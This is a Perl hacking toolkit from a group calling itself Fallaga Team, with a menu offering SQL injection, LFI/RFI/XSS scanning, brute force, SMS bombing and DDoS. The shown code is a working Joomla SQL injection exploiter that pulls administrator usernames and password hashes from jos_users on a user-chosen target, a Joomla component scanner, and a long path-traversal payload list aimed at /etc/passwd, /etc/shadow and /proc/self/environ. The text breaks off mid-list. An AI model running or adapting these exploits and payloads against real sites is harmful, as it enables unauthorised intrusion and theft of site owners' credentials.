#!/usr/bin/perl
#Salam 3alaykoum  
#  (c) Copyright :/ 
use HTTP::Request;
use LWP::UserAgent;
use Digest::MD5;
use MIME::Base64;
use LWP::Simple;
use IO::Socket;
use HTTP::Request::Common;
use Term::ANSIColor;
system('cls');
system('title Fallaga Team');
print color("white"),"==========================================================\n";
print color("red"),"      root@fallaga:~#perl kartouch.pl   \n";
print color("red"),"      [+] Fallaga Team | Fallag crx  [+]      \n";
print color("red"), "     Test it In co.il _ co.uk __ gov __ https *.* < try mdr >    \n";
print color("white"), "==========================================================\n";
print color("green"),"[1] Shell Finder\n";
print color("green"),"[2] Admin Finder\n";
print color("green"), "[3] Dorker Bing\n";
print color("green"), "[4] Lfi Rfi Xss Scanner\n";
print color("green"), "[5] Joomla Component Scanner\n";
print color("green"), "[6] SMS Bomber\n";
print color("green"), "[7] Proxy Grabber\n";
print color("green"), "[8] Wordpress Plugin Checker\n";
print color("green"), "[9] Jce Server Scanner\n";
print color("green"), "[10] Md5 Cracker Online\n";
print color("green"), "[11] FckEditor Dir Tester\n";
print color("green"), "[12] Sqli Scanner\n";
print color("green"), "[13] Wordpress Site Finder\n";
print color("green"), "[14] Wordpress BruteFoce\n";
print color("green"), "[15] Joomla Sql Injection Tester\n";
print color("green"), "[16] DDOS\n";
print color("green"), "[17] Reverse IP\n";
print color("green"), "[1x] About Me\n\n";
print "[+] Choose Number : ";
my $targett = <>;
chomp $targett;
if($targett eq '15')
{
system('cls');
system('title Joomla Sqli Injection Tester');
use LWP::Simple;
use LWP::UserAgent;
use HTTP::Cookies;
use POSIX qw(strftime);
use Term::ANSIColor qw(:constants);

if($^O =~ /Win/){
system("cls");
}else{
system("clear");
}
my $date = localtime();
my ($sec,$min,$hour,$day,$mon,$year,$wday,$yday,$isdst)=localtime(time);
print RED, q {

W E _ K I L L _ A N N I M A L S 

};
print RESET;

$target = $ARGV[0];
#loooooooool :v
@vuln = (
"/index.php?option=com_jobprofile&Itemid=61&task=profilesview&id=-1",
"/index.php?tmpl=component&option=com_redshop&view=product&task=addtocompare&pid=-24",
"/index.php?option=com_virtuemart&view=user&task=removeAddressST&virtuemart_userinfo_id=-16",
"/index.php?option=com_jvideoclip&view=search&type=user&uid=-1",
"/index.php?option=com_mamml&listid=-1",
"/index.php?option=com_fq&Itemid=3&listid=-9999999",
"/index.php?option=com_listing&task=browse&category_id=-1",
"/index.php?option=com_techfolio&view=techfoliodetail&catid=-1",
"/index.php?option=com_tupinambis&task=verproyecto&proyecto=-1",
"/index.php?option=com_tupinambis&task=verproyecto&proyecto=-1",
"/index.php?option=com_hwdvideoshare&func=viewcategory&Itemid=2&cat_id=-1",
"/index.php?option=com_pccookbook&page=viewuserrecipes&user_id=-1",
"/index.php?option=com_clasifier&Itemid=1&cat_id=-1",
"/index.php?option=com_jooget&Itemid=2&task=detail&id=-1",
"/index.php?option=com_galeria&Itemid=7&func=detail&id=-1",
"/index.php?option=com_paxxgallery&Itemid=85&gid=7&userid=1&task=view&iid=-1",
"/index.php?option=com_mcquiz&task=user_tst_shw&Itemid=1&tid=-1",
"/index.php?option=com_quiz&task=user_tst_shw&Itemid=1&tid=-1",
"/index.php?option=com_xfaq&task=answer&Itemid=1&catid=97&aid=-1",
"/index.php?option=com_gallery&Itemid=0&func=detail&id=-1",
"/index.php?option=com_rapidrecipe&page=showuser&user_id==1",
"/index.php?option=com_downloads&Itemid=10&func=selectfolder&filecatid=-1",
"/index.php?option=com_shambo2&Itemid=-1",
"/index.php?option=com_neoreferences&Itemid=27&catid=-1",
"/index.php?option=com_akogallery&Itemid=11&func=detail&id=-1",
"/index.php?option=com_catalogshop&Itemid=13&func=detail&id=-1",
"/index.php?option=com_restaurant&Itemid=10&func=detail&id=-1",
"/index.php?option=com_musepoes&task=answer&Itemid=1&catid=2&aid=-1",
"/index.php?option=com_recipes&Itemid=2&func=detail&id=-1",
"/index.php?option=com_jokes&Itemid=1&func=CatView&cat=-1",
"/index.php?option=com_estateagent&Itemid=21&func=showObject&info=contact&objid=-1",
"/index.php?option=com_newsletter&Itemid=1&listid=-9999999"
);
@sqli = ('+union+all+select+1,concat_ws(0x3a,usertype,username,password),3,4,5,6,7,8,9+from+jos_users'
#,'/**/union/**/select/**/0,0,password,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,username/**/from/**/mos_users/*'
#,'/**/union/**/select/**/0,0,password,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,username/**/from/**/jos)users/*'
#,'/**/union/**/select/**/0,concat(username,0x3a,password),concat(username,0x3a,password)/**/from/**/mos_users/*'
#,'/**/union/**/select/**/0,concat(username,0x3a,password),concat(username,0x3a,password)/**/from/**/jos_users/*'
#,'+union+select+1,2,3,concat_ws(0x3a,username,password)fallag,5,6,7,8,9,10,11+from+mos_users--'
#,'+union+select+1,2,3,concat_ws(0x3a,username,password)fallag,5,6,7,8,9,10,11+from+jos_users--'
);
print GREEN, q(
 Joomla SQLi Exploiter
 Contact me at : fallag.crx@mail.ru
 crx Team Here!!
);
chomp $target;

print "[+] Enter Joomla Site: ";
chomp ($target = <STDIN>);
print RESET;
print YELLOW, "-----------------------------------------------------------------------------------------------
[!] Atacking info
-----------------------------------------------------------------------------------------------
[!] Target  : $target
[!] Method  : SQL injection
[!] Started : $hour:$min:$sec\n";
print "-----------------------------------------------------------------------------------------------
[!] Exploiting $target...
[!] Please wait bitch!\n";
print RESET;
foreach $vuln(@vuln){
foreach $sqli(@sqli){
$expl = "http://" . $target . $vuln . $sqli;
$req   = HTTP::Request->new(GET=>$expl);
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2.12) Gecko/20101026 Firefox/3.6.12");
$ua->timeout (10);
$ua->cookie_jar(
HTTP::Cookies->new(
file => 'cookies.txt',
autosave => 1
)
);
$res = $ua->request($req);
if ($res->is_success) {
$res   = $res->content;
if ($res =~ /Administrator:(.*):(.*)/) {
#if ($res =~ m/:/g) {
($user) = ($1);
my ($sec,$min,$hour)=localtime();
print "-----------------------------------------------------------------------------------------------";
print GREEN, "
[$hour:$min:$sec]
[+] Exploit Succes !";
print ON_BLUE, GREEN, "
[+] $user\n";
printlog ("
Joomla SQLi Log
Date     : $date
Target   : $expl
Exploit  : $user\n
");
print RESET;
print YELLOW, "-----------------------------------------------------------------------------------------------\n";
print RESET;
exit;
}
}
}}
print YELLOW, "-----------------------------------------------------------------------------------------------\n";
print RESET;
my ($sec,$min,$hour)=localtime();
print BLUE, "[$hour:$min:$sec]
[-] Exploit SQLi at $target failed! \n";
print RESET;
print YELLOW, "-----------------------------------------------------------------------------------------------\n";

sub printlog
{
my ($logsec,$logmin,$loghour,$logmday,$logmon,$logyear,$logwday,$logyday,$logisdst)=localtime(time);
my $logtimestamp = sprintf("%4d-%02d-%02d,%02d:%02d:%02d",$logyear+1900,$logmon+1,$logmday,$loghour,$logmin,$logsec);
$logmon++;
$logyear=$logyear+1900;
my $log="[$logdir$logyear-$logmon-$logmday]SQLi.log";
open(lo,">>$log") or die "$log:$!";
print lo @_[0];
close(lo);
return;
}}
if($targett eq '5')
{
system('cls');
system('title Joomla Component Scanner');
package control;
use HTTP::Request;
use LWP::UserAgent;

system('cls');
system(' Title Files and Directory Scanner ');
system "color a";
print"\n";
print  "\t>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>\n";
print "\t>                    Joomla Component Scanner                      >\n";
print "\t>                                                                  >\n";
print "\t>                        Fallag crx                        >\n";
print "\t>       	 fallaga Team | crypton_x               >\n";
print "\t>                         Result In com.txt                        >\n";
print  "\t>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>\n";
print "\n";

print " Scan Your site Site\n\n Example: www.victim.com \n\n-> ";


$site=<STDIN>;
chomp $site;

if($site !~ /http:\/\//) { $site = "http://$site/"; };

print "\n";
@path = ('/components/com_tag',
'/components/com_virtuemart',
'/components/com_jvehicles',
'/components/com_s5clanroster',
'/components/com_fireboard',
'/components/com_fabrik',
'/components/com_jinc',
'/components/com_xcloner-backupandrestore',
'/components/com_dshop',
'/components/com_ponygallery',
'/components/com_bearleague',
'/components/com_obsuggest',
'/components/com_alameda',
'/components/com_estateagent',
'/components/com_collector',
'/components/com_qcontacts',
'/components/com_niceajaxpoll',
'/components/com_xmap',
'/components/com_team',
'/components/com_joomnik',
'/components/com_question',
'/components/com_jmsfileseller',
'/components/com_rsfiles',
'/components/com_versioning',
'/components/com_hello',
'/components/com_calcbuilder',
'/components/com_jmsfileseller',
'/components/com_xmovie',
'/components/com_people',
'/components/com_idoblog',
'/components/com_adsmanager',
'/components/com_xgallery',
'/components/com_alfurqan15x',
'/components/com_alfurqan',
'/components/com_billyportfolio',
'/components/com_jimtawl',
'/components/com_content',
'/components/com_jfuploader',
'/components/com_kunena',
'/components/com_jooproperty',
'/components/com_jsupport',
'/components/com_markt',
'/components/com_img',
'/components/com_clanlist',
'/components/com_clan',
'/components/com_ckforms',
'/components/com_dcnews',
'/components/com_connect',
'/components/com_rsappt_pro2',
'/components/com_techfolio',
'/components/com_zcalendar',
'/components/com_tpjobs',
'/components/com_simpleshop',
'/components/com_sef',
'/components/com_searchlog',
'/components/com_contact',
'/components/com_enmasse',
'/components/com_elite_experts',
'/components/com_ezautos',
'/components/com_jgen',
'/components/com_jphone',
'/components/com_mosets',
'/components/com_jefaqpro',
'/components/com_picsell',
'/components/com_ongallery',
'/components/com_equipment',
'/components/com_zoomportfolio',
'/components/com_amblog',
'/components/com_joltcard',
'/components/com_jp_jobs',
'/components/com_bfquiztrial',
'/components/com_qpersonel',
'/components/com_pandafminigames',
'/components/com_golfcourseguid',
'/components/com_jejob',
'/components/com_jeajaxeventcalendar',
'/components/com_jradio',
'/components/com_spidercatalog',
'/components/com_/components/commedia',
'/components/com_fss',
'/components/com_icagenda',
'/components/com_spidercalendar',
'/components/com_joomgalaxy',
'/components/com_ornekek',
'/components/com_weblinks',
'/components/com_rokmodule',
'/components/com_discussions',
'/components/com_hm/components/community',
'/components/com_eslamiat',
'/components/com_listing',
'/components/com_jeemasms',
'/components/com_yjcontactus',
'/components/com_timereturns',
'/components/com_jce',
'/components/com_joomtouch',
'/components/com_jdirectory',
'/components/com_jesubmit',
'/components/com_sobi2',
'/components/com_acooldebate',
'/components/com_booklibrary',
'/components/com_acymailing',
'/components/com_doqment',
'/components/com_allcinevid',
'/components/com_jotloader',
'/components/com_jeauto',
'/components/com_ccboard',
'/components/com_ccinvoices',
'/components/com_flipwall',
'/components/com_sponsorwall',
'/components/com_cbe',
'/components/com_jscalendar',
'/components/com_restaurantguide',
'/components/com_nkc',
'/components/com_aardvertiser',
'/components/com_clantools',
'/components/com_remository',
'/components/com_dateconverter',
'/components/com_wmtpic',
'/components/com_donateprocess',
'/components/com_gamesbox',
'/components/com_jcafe',
'/components/com_awd_song',
'/components/com_picasa2gallery',
'/components/com_ybggal',
'/components/com_joomdocs',
'/components/com_answers',
'/components/com_galleryxml',
'/components/com_oziogallery2',
'/components/com_listbingo',
'/components/com_easygb',
'/components/com_jtickets',
'/components/com_jesectionfinder',
'/components/com_realtyna',
'/components/com_/components/community',
'/components/com_jomestate',
'/components/com_jtickets',
'/components/com_cinema',
'/components/com_jstore',
'/components/com_annonces',
'/components/com_lead',
'/components/com_sar_news',
'/components/com_chronocontact',
'/components/com_chronoconnectivity',
'/components/com_djartgallery',
'/components/com_quran',
'/components/com_g2bridge',
'/components/com_reservations',
'/components/com_jepoll',
'/components/com_mycar',
'/components/com_mediqna',
'/components/com_zelig',
'/components/com_bookmarks',
'/components/com_hotproperty',
'/components/com_jombib',
'/components/com_store',
'/components/com_mosforms',
'/components/com_/components/comprofiler',
'/components/com_crowdsource',
'/components/com_camp',
'/components/com_ms/components/comment',
'/components/com_extcalendar',
'/components/com_imoti',
'/components/com_product',
'/components/com_event',
'/components/com_simpledownload',
'/components/com_news',
'/components/com_article',
'/components/com_jequoteform',
'/components/com_konsultasi',
'/components/com_sebercart',
'/components/com_php',
'/components/com_jinc',
'/components/com_mytube',
'/components/com_jbudgetsmagic',
'/components/com_surveymanager',
'/components/com_jreservation',
'/components/com_foobla_suggestions',
'/components/com_djcatalog',
'/components/com_turtushout',
'/components/com_alphauserpoints',
'/components/com_lucygames',
'/components/com_bfsurvey_profree',
'/components/com_tpdugg',
'/components/com_joomloc',
'/components/com_joomlub',
'/components/com_artportal',
'/components/com_agora',
'/components/com_gameserver',
'/components/com_digifolio',
'/components/com_bca-rss-syndicator',
'/components/com_expose',
'/components/com_equotes',
'/components/com_media',
'/components/com_misterestate',
'/components/com_wrapper',
'/components/com_mailto',
'/components/com_autartimonial',
'/components/com_artforms',
'/components/com_redshop',
'/components/com_staticxt',
'/components/com_spa',
'/components/com_jomtube',
'/components/com_golfcourseguide',
'/components/com_huruhelpdesk',
'/components/com_joomdle',
'/components/com_youtube',
'/components/com_joomla-visites',
'/components/com_ttvideo',
'/components/com_appointinator',
'/components/com_photomapgallery',
'/components/com_spielothek',
'/components/com_pbbooking',
'/components/com_beamospetition',
'/components/com_neorecruit',
'/components/com_cgtestimonial',
'/components/com_jgrid',
'/components/com_zina',
'/components/com_pro_desk',
'/components/com_user',
'/components/com_k2',
'/components/com_rsbook_15',
'/components/com_gk3_photoslide',
'/components/com_jvideodirect',
'/components/com_jcalpro',
'/components/com_banners',
'/components/com_datsogallery',
'/components/com_joomradio',
'/components/com_jfbconnect',
'/components/com_myblog',
'/components/com_phocamaps',
'/components/com_contact_enhanced',
'/components/com_aicontactsafe',
'/components/com_poll',);


foreach $com(@path){

$url = $site.$com;
$req = HTTP::Request->new(GET=>$url);
$useragent = LWP::UserAgent->new();

$response = $useragent->request($req);

if ($response->is_success){
print "$com\n";
 $url = substr($url, $com + 13);
 $com = substr($url, 0, index($url, '"'));
 open (txt,">>com.txt");
 print txt  $com,"\n";
 close(txt);
print "=> Dir Found : $url\n";
}
else {
print "=> Not Found : $com\n";
}}
}

if($targett eq '4')
{
system('cls');
system('title Lfi Rfi Xss Scanner');
                    {
use LWP::Simple;
system(($^O eq 'MSWin32') ? 'cls' : 'clear');
print "#############################################################";
print "\n\t\t Fallaga Scanner [XSS - LFI - RFI]";
print "\n\t\t <<<  Fallaga | Team  >>>";
print "\n\t\t ReCode By Fallag crx";
sleep (1);
print "\n\n\t\t crypton_x Menu ";
print "\n \t\t 1- XSS SCAN ";
print "\n \t\t 2- LFI SCAN ";
print "\n \t\t 3- RFI SCAN (FOR JOOMLA) ";
print "\n \t\t 4- XSS & LFI ";
print  "\n\n \t\t 5- Exit\n";
print "\n Choose :";
$ID =<STDIN>;
######
@LFI =("/etc/passwd","../etc/passwd","../../etc/passwd","../../../etc/passwd","../../../../etc/passwd","../../../../../etc/passwd","../../../../../../etc/passwd","../../../../../../../etc/passwd","../../../../../../../../etc/passwd","../../../../../../../../../etc/passwd","../../../../../../../../../../etc/passwd","/etc/passwd%00","../etc/passwd%00","../../etc/passwd%00","../../../etc/passwd%00","../../../../etc/passwd%00","../../../../../etc/passwd%00","../../../../../../etc/passwd%00","../../../../../../../etc/passwd%00","../../../../../../../../etc/passwd%00","../../../../../../../../../etc/passwd%00","../../../../../../../../../../etc/passwd%00","....//etc/passwd","....//....//etc/passwd","....//....//....//etc/passwd","....//....//....//....//etc/passwd","....//....//....//....//....//etc/passwd","....//....//....//....//....//....//etc/passwd","....//....//....//....//....//....//....//etc/passwd","....//....//....//....//....//....//....//....//etc/passwd","....//....//....//....//....//....//....//....//....//etc/passwd","....//....//....//....//....//....//....//....//....//....//etc/passwd","....//etc/passwd%00","....//....//etc/passwd%00","....//....//....//etc/passwd%00","....//....//....//....//etc/passwd%00","....//....//....//....//....//etc/passwd%00","....//....//....//....//....//....//etc/passwd%00","....//....//....//....//....//....//....//etc/passwd%00","....//....//....//....//....//....//....//....//etc/passwd%00","....//....//....//....//....//....//....//....//....//etc/passwd%00","....//....//....//....//....//....//....//....//....//....//etc/passwd%00","%2Fetc%2Fpasswd","..%2Fetc%2Fpasswd","..%2F..%2Fetc%2Fpasswd","..%2F..%2F..%2Fetc%2Fpasswd","..%2F..%2F..%2F..%2Fetc%2Fpasswd","..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd","%2Fetc%2Fpasswd%00","..%2Fetc%2Fpasswd%00","..%2F..%2Fetc%2Fpasswd%00","..%2F..%2F..%2Fetc%2Fpasswd%00","..%2F..%2F..%2F..%2Fetc%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00","....%2f%2Fetc/passwd","....%2f%2F....%2f%2Fetc/passwd","....%2f%2F....%2f%2F....%2f%2Fetc/passwd","....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/passwd","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/passwd","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/passwd","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/passwd","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/passwd","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/passwd","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/passwd","....%2f%2Fetc/passwd%00","....%2f%2F....%2f%2Fetc/passwd%00","....%2f%2F....%2f%2F....%2f%2Fetc/passwd%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/passwd%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/passwd%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/passwd%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/passwd%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/passwd%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/passwd%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/passwd%00","/proc/self/environ","../proc/self/environ","../../proc/self/environ","../../../proc/self/environ","../../../../proc/self/environ","../../../../../proc/self/environ","../../../../../../proc/self/environ","../../../../../../../proc/self/environ","../../../../../../../../proc/self/environ","../../../../../../../../../proc/self/environ","../../../../../../../../../../proc/self/environ","/proc/self/environ%00","../proc/self/environ%00","../../proc/self/environ%00","../../../proc/self/environ%00","../../../../proc/self/environ%00","../../../../../proc/self/environ%00","../../../../../../proc/self/environ%00","../../../../../../../proc/self/environ%00","../../../../../../../../proc/self/environ%00","../../../../../../../../../proc/self/environ%00","../../../../../../../../../../proc/self/environ%00","%2Fproc%2Fself%2Fenviron","..%2Fproc%2Fself%2Fenviron","..%2F..%2Fproc%2Fself%2Fenviron","..%2F..%2F..%2Fproc%2Fself%2Fenviron","..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron","..%2F..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron","..%2F..%2F..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron","..%2F..%2F..%2F..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron","%2Fproc%2Fself%2Fenviron%00","..%2Fproc%2Fself%2Fenviron%00","..%2F..%2Fproc%2Fself%2Fenviron%00","..%2F..%2F..%2Fproc%2Fself%2Fenviron%00","..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron%00","..%2F..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron%00","..%2F..%2F..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron%00","//proc/self/environ","....//proc/self/environ","....//....//proc/self/environ","....//....//....//proc/self/environ","....//....//....//....//proc/self/environ","....//....//....//....//....//proc/self/environ","....//....//....//....//....//....//proc/self/environ","....//....//....//....//....//....//....//proc/self/environ","....//....//....//....//....//....//....//....//proc/self/environ","....//....//....//....//....//....//....//....//....//proc/self/environ","....//....//....//....//....//....//....//....//....//....//proc/self/environ","//proc/self/environ%00","....//proc/self/environ%00","....//....//proc/self/environ%00","....//....//....//proc/self/environ%00","....//....//....//....//proc/self/environ%00","....//....//....//....//....//proc/self/environ%00","....//....//....//....//....//....//proc/self/environ%00","....//....//....//....//....//....//....//proc/self/environ%00","....//....//....//....//....//....//....//....//proc/self/environ%00","....//....//....//....//....//....//....//....//....//proc/self/environ%00","....//....//....//....//....//....//....//....//....//....//proc/self/environ%00","%2f%2Fproc/self/environ","....%2f%2Fproc/self/environ","....%2f%2F....%2f%2Fproc/self/environ","....%2f%2F....%2f%2F....%2f%2Fproc/self/environ","....%2f%2F....%2f%2F....%2f%2F....%2f%2Fproc/self/environ","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fproc/self/environ","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fproc/self/environ","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fproc/self/environ","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fproc/self/environ","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fproc/self/environ","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fproc/self/environ","%2f%2Fproc/self/environ%00","....%2f%2Fproc/self/environ%00","....%2f%2F....%2f%2Fproc/self/environ%00","....%2f%2F....%2f%2F....%2f%2Fproc/self/environ%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2Fproc/self/environ%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fproc/self/environ%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fproc/self/environ%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fproc/self/environ%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fproc/self/environ%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fproc/self/environ%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fproc/self/environ%00","/etc/shadow","../etc/shadow","../../etc/shadow","../../../etc/shadow","../../../../etc/shadow","../../../../../etc/shadow","../../../../../../etc/shadow","../../../../../../../etc/shadow","../../../../../../../../etc/shadow","../../../../../../../../../etc/shadow","../../../../../../../../../../etc/shadow","/etc/shadow%00","../etc/shadow%00","../../etc/shadow%00","../../../etc/shadow%00","../../../../etc/shadow%00","../../../../../etc/shadow%00","../../../../../../etc/shadow%00","../../../../../../../etc/shadow%00","../../../../../../../../etc/shadow%00","../../../../../../../../../etc/shadow%00","../../../../../../../../../../etc/shadow%00","%2Fetc..%2Fshadow","..%2Fetc%2Fshadow","..%2F..%2Fetc%2Fshadow","..%2F..%2F..%2Fetc%2Fshadow","..%2F..%2F..%2F..%2Fetc%2Fshadow","..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow","..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow","..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow","%2Fetc..%2Fshadow%00","..%2Fetc%2Fshadow%00","..%2F..%2Fetc%2Fshadow%00","..%2F..%2F..%2Fetc%2Fshadow%00","..%2F..%2F..%2F..%2Fetc%2Fshadow%00","..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow%00","..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow%00","%2F%2Fetc/shadow","....%2f%2Fetc/shadow","....%2f%2F....%2f%2Fetc/shadow","....%2f%2F....%2f%2F....%2f%2Fetc/shadow","....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/shadow","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/shadow","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/shadow","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/shadow","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/shadow","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/shadow","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/shadow","%2F%2Fetc/shadow%00","....%2f%2Fetc/shadow%00","....%2f%2F....%2f%2Fetc/shadow%00","....%2f%2F....%2f%2F....%2f%2Fetc/shadow%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/shadow%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/shadow%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/shadow%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/shadow%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/shadow%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/shadow%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/shadow%00","....//etc/shadow","....//....//etc/shadow","....//....//....//etc/shadow","....//....//....//....//etc/shadow","....//....//....//....//....//etc/shadow","....//....//....//....//....//....//etc/shadow","....//....//....//....//....//....//....//etc/shadow","....//....//....//....//....//....//....//....//etc/shadow","....//....//....//....//....//....//....//....//....//etc/shadow","....//....//....//....//....//....//....//....//....//....//etc/shadow","....//etc/shadow%00","....//....//etc/shadow%00","....//....//....//etc/shadow%00","....//....//....//....//etc/shadow%00","....//....//....//....//....//etc/shadow%00","....//....//....//....//....//....//etc/shadow%00","....//....//....//....//....//....//....//etc/shadow%00","....//....//....//....//....//....//....//....//etc/shadow%00","....//....//....//....//....//....//....//....//....//etc/shadow%00","....//....//....//....//....//....//....//....//....//....//etc/shadow%00","/etc/group","../etc/group","../../etc/group","../../../etc/group","../../../../etc/group","../../../../../etc/group","../../../../../../etc/group","../../../../../../../etc/group","../../../../../../../../etc/group","../../../../../../../../../etc/group","../../../../../../../../../../etc/group","/etc/group%00","../etc/group%00","../../etc/group%00","../../../etc/group%00","../../../../etc/group%00","../../../../../etc/group%00","../../../../../../etc/group%00","../../../../../../../etc/group%00","../../../../../../../../etc/group%00","../../../../../../../../../etc/group%00","../../../../../../../../../../etc/group%00","%2Fetc..%2Fgroup"